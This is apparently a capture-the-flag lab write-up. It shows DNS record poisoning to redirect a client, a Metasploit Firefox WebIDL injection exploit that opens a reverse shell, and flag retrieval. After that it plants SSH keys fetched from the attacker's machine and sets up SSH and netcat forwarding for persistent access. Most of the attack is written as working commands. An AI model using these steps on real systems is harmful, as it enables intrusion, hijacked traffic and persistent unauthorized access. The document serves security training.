# 5d402e_client_side_attack

We have control of a DNS server(10.0.3.133) and we know that a client(10.0.7.225) is connecting to Cuiteur(10.0.2.197) at regular intervals.

In the DNS server, we change the IP address of Cuiteur to our own IP address.
```
# use the php-dns as a DNS server
ps -ef | grep dns
root       315     1  0 12:01 ?        00:00:00 php /usr/bin/php-dns

# find the config file
find /etc -type f -exec grep -l "10.0.2.197" {} \; 2>/dev/null
/etc/php-dns/dns_records.json

# change A address to our kali IP
"cuiteur-s6.ethhak":
{"A": "192.168.0.7"},


# restart the service
systemctl restart php-dns

# or start the service manually
/usr/bin/php-dns

```

According to the result of last 14ce18_traffic_sniffing challenge, we know the client is Firefox version 26. There is vulnerability called [firefox_webidl_injection](https://www.hackingarticles.in/exploit-remote-pc-using-firefox-webidl-privileged-javascript-injection/)
```
use exploit/multi/browser/firefox_webidl_injection
set payload firefox/shell_reverse_tcp
set srvhost 192.168.0.7
set srvport 8080
set lhost 192.168.0.7
set lport 4444
set URIPATH /
exploit
sessions -u 1  #  upgrade sessions to a meterpreter one
sessions -l
sessions -i 2
meterpreter > sysinfo
meterpreter > shell
> find / -name "flag*" 2>/dev/null
/home/ubuntu/flag{5d402e77264991c2580b8dd9a546bd8718b40c06fd711e}.jpg

```


After we get the flag, we can find private key of the current user in `.ssh` folder.


## getting a better shell

The first option is to upgrade the netcat shell to fully interactive shell, https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/.

Another option is ssh forwarding.

Remote forwarding:
```
# prepare keys, kali machine
ssh-keygen -f c_id_rsa
chmod 600 c_id_rsa
cat c_id_rsa.pub >> ~/.ssh/authorized_keys

# ship keys to the target
cd ~/.ssh
wget 192.168.0.7:8000/c_id_rsa
wget 192.168.0.7:8000/c_id_rsa.pub
chmod 600 c_id_rsa
cat c_id_rsa.pub >> ~/.ssh/authorized_keys

# set SSH server on our kalii machine
sudo mkdir /run/sshd
sudo /usr/sbin/sshd -f /etc/ssh/sshd_config -d


# set port forwarding on the target
ssh -R -N 19999:127.0.0.1:22 jinjia@192.168.0.7 -i c_id_rsa -o StrictHostKeyChecking=no

# connect to the target on the kali machine
# the traffic to 19999 is forwarded to the target 22 port
ssh target@127.0.0.1 -i c_id_rsa -p 19999 -o StrictHostKeyChecking=no
```


Local forwarding
```
# on the kali machine
ssh -L 19999:10.0.7.225:7777 blade@10.0.7.225 -i blade_id_rsa -p 52961 -o StrictHostKeyChecking=no
nc -lvp 7777


# on the kali machine
# the traffic to 19999 is forwarded to the target 7777 port
nc 127.0.0.1 19999

```